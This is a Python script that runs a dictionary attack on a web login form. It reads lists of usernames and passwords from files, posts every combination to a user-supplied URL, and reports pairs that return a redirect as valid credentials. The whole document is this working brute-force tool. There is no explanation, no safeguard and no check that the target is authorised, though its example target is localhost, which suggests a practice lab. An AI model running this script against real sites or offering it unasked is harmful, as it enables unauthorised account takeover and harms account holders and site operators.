import requests
from urllib.parse import urlparse

def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return parsed.scheme in ['http', 'https'] and parsed.netloc
    except:
        return False

while True:
    url = input("Enter the target URL (ex. http://127.0.0.1:5000/login): ").rstrip('/')
    if not is_valid_url(url):
        print("Invalid URL. Please enter a valid URL that starts with http:// or https://")
        continue
    break

try:
    with open("usernames.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open("passwords.txt", "r") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)

successful = []

for username in usernames:
    for pwd in passwords:
        data = {
            "username": username,
            "password": pwd
        }
        try:
            response = requests.post(url, data=data, allow_redirects=False)
            if response.status_code == 302:
                print(f"[+] SUCCESS: {username} / {pwd}")
                successful.append((username, pwd))
            else:
                print(f"[-] FAIL: {username} / {pwd}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed for {username} / {pwd}: {e}")

print("\nScan complete.")
if successful:
    print("[+] Valid credentials found:")
    for u, p in successful:
        print(f"    → {u} / {p}")
else:
    print("[-] No valid credentials found.")
